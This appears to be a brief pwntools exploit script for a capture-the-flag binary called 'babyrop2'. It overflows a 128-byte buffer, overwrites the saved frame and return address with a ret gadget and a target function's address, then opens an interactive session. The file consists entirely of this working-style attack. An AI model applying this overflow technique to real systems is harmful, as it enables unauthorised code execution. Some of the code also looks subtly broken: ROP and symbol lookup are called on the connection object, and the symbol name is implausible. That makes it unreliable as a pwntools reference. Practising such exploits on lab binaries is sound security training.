from pwn import *
import sys

if len(sys.argv) == 1:
    r = process("./babyrop2")
else:
    r = remote("127.0.0.1", 1337)

rop = ROP(r)
vuln = r.symbols["Beli RoP Energy($313370)"]
ret = rop.find_gadget(["ret"])[0]
r.sendline("3")
r.sendline(b"A" * 128 + b"B" * 8 + p64(ret) + p64(vuln))
r.interactive()
